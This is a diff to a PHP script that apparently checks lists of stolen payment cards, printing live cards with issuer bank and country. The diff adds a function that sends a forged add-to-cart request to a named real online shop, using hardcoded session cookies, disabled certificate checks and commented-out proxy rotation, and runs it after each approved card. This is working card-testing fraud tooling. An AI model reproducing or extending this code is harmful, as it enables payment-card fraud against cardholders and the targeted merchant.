@@ -138,7 +138,49 @@ $auth = substr(str_shuffle(str_repeat("ABCDEFGHIJabcdefghijklmopqrstuvxyz", 12))
 
 
 #req1==============================================================================
+function updatecart(){
 
+
+$ch = curl_init();
+curl_setopt($ch, CURLOPT_URL, 'https://www.artofhearing.com.au/online-shop/test-2/');
+curl_setopt($ch, CURLOPT_HEADER, 0);
+curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
+   // curl_setopt($ch, CURLOPT_PROXY, $proxySocks);
+   // curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_SOCKS5);
+// curl_setopt($ch, CURLOPT_PROXY, "http://$super_proxy:$port");
+// curl_setopt($ch, CURLOPT_PROXYUSERPWD, "$username-session-$session:$password");
+curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
+curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
+curl_setopt($ch, CURLOPT_ENCODING, "gzip, deflate, br");
+curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
+curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
+curl_setopt($ch, CURLOPT_HTTPHEADER, array(
+'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
+'Accept-Encoding: gzip, deflate, br',
+'Accept-Language: en-US,en;q=0.9',
+'Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryu2trXQJjayDO4cu5',
+'Cookie: landing_page=https%3A%2F%2Fwww.artofhearing.com.au%2F; psn_atf=1; external_referral_site=https%3A%2F%2Fwww.artofhearing.com.au%2F; soundestID=20200605030326-WwmAJQN65GxQ6WcWK06UGlh7gbJ4Q8bw8wUHWsFscOG9LD8B0; omnisendAnonymousID=ICTwJJ3E5Jc1DG-20200605030326; tk_ai=woo%3AOKpJ%2BkfjVqAD9gwdRz527Bb3; wp_woocommerce_session_32f5003ec3b6d66ccbe7ba41cc09cc9d=94ecc6e78c59725a1f42e754c62e73c6%7C%7C1591499073%7C%7C1591495473%7C%7Cf64db11e102bd77c91b41ea9198bb484; omnisendSessionID=TNf8YazO3LSBuh-20200605171554; pre_submission_page=https%3A%2F%2Fwww.artofhearing.com.au%2Fonline-shop%2Ftest-2%2F; submission_page=https%3A%2F%2Fwww.artofhearing.com.au%2Fonline-shop%2Ftest-2%2Fui.js; soundest-views=36',
+'Host: www.artofhearing.com.au',
+'Origin: https://www.artofhearing.com.au',
+'Referer: https://www.artofhearing.com.au/online-shop/test-2/',
+'user-agent: '.$browser.''
+));
+
+curl_setopt($ch, CURLOPT_POSTFIELDS, '------WebKitFormBoundary1PrEDSO8bvXH5drn
+Content-Disposition: form-data; name="quantity"
+
+1
+------WebKitFormBoundary1PrEDSO8bvXH5drn
+Content-Disposition: form-data; name="add-to-cart"
+
+8265
+------WebKitFormBoundary1PrEDSO8bvXH5drn--');
+
+
+$b_pago = curl_exec($ch);
+}
 // #==========================================================================================================
 
 
@@ -187,6 +229,8 @@ $result = curl_exec($ch);
 
 
  if(strpos($result,'"result":"success"')){
+   updatecart();
+
     echo '<tr><td><font size="2"><font color="#00FF00">#Aprovada </font></td><td>&nbsp;&nbsp;&nbsp;<font size="2"><font color="#C0C0C0">'.$lista.'</font></td><td><font></font><td><font size="2">&nbsp;&nbsp;&nbsp;<b><font color="#FFDF00">  [ L I V E ]&nbsp;&nbsp;&nbsp;<font size="0.5"><font color="#0086ff"> '.$issuecountry.' | '.$issuebank.' | DEBIT- '.$type.' | cat-'.$category.'</font></b></font></td></tr>';
 
 
@@ -198,7 +242,6 @@ else {
 
        echo '<tr><td><font size="2"><font color="#FF0000">#Reprovada </font></td><td>&nbsp;&nbsp;&nbsp;<font size="2"><font color="#C0C0C0">'.$lista.'</font></td><td><font></font><td><font size="2">&nbsp;&nbsp;&nbsp;<b><font color="#FFDF00">  [ '.$message.' ]&nbsp;&nbsp;&nbsp;<font size="0.5"><font color="#0086ff"> '.$issuecountry.' | '.$issuebank.' | DEBIT- '.$type.' | cat- '.$category.'</font></b></font></td></tr>';
 
-// updatecart();
 }
 
 curl_close($ch);
